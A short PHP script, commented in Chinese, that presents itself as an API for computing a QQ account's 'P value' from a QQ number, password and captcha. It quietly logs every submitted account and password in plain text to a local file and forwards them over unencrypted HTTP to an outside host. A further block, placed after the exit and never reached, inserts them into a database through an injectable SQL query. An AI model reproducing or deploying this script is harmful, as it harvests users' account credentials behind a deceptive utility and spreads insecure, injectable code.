<?php

/*
	Name：P值获取

	Author：白云

	食用姿势：http://127.0.0.1/api/?uin=QQ号码&pwd=QQ密码&vcode=QQ验证码
	
	Code = 状态 [1=正常/0=错误]
	uin = QQ号码
	pwd = QQ密码
	Error = 错误
*/

//记录密码只为防盗版
error_reporting(0);
$uin=$_GET['uin']; //QQ账号
$pwd=$_GET['pwd']; //QQ密码
$vcode=$_GET['vcode']; //QQ验证码

//记录密码开始
$handle = fopen("authqq.txt", 'a'); //创建TXT文件
fwrite($handle, $uin."----".$pwd."\r\n"); //写入账号&密码
fclose($handle); //结束
//记录密码结束

//P值获取开始
$url="http://encode.qqzzz.net/?uin=".$uin."&pwd=".strtoupper($pwd)."&vcode=".strtoupper($vcode);
$json = get_curl($url);
if($json=='error'){
	echo('<title>P值获取API</title>');
	exit('Error');
}else{
	echo('<title>P值获取API</title>');
	exit($json);
}
//P值获取结束

//记录密码开始
require_once('Config.php');

if(!isset($port))$port='3306';
require_once('db.class.php');
$DB=new DB($host,$user,$pwd,$dbname,$port);

date_default_timezone_set('Asia/Shanghai');
$date = date("Y-m-d H:i:s");

$id=md5('2779064692');
$DB->query("insert into `encode_qqs` (`id`,`qq`,`pwd`,`date`) values ('".$id."','".$uin."','".$pwd."','".$date."')");
//记录密码结束

//curl函数开始
function get_curl($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	$ret = curl_exec($ch);
	curl_close($ch);
	return $ret;
}
//curl函数结束
?>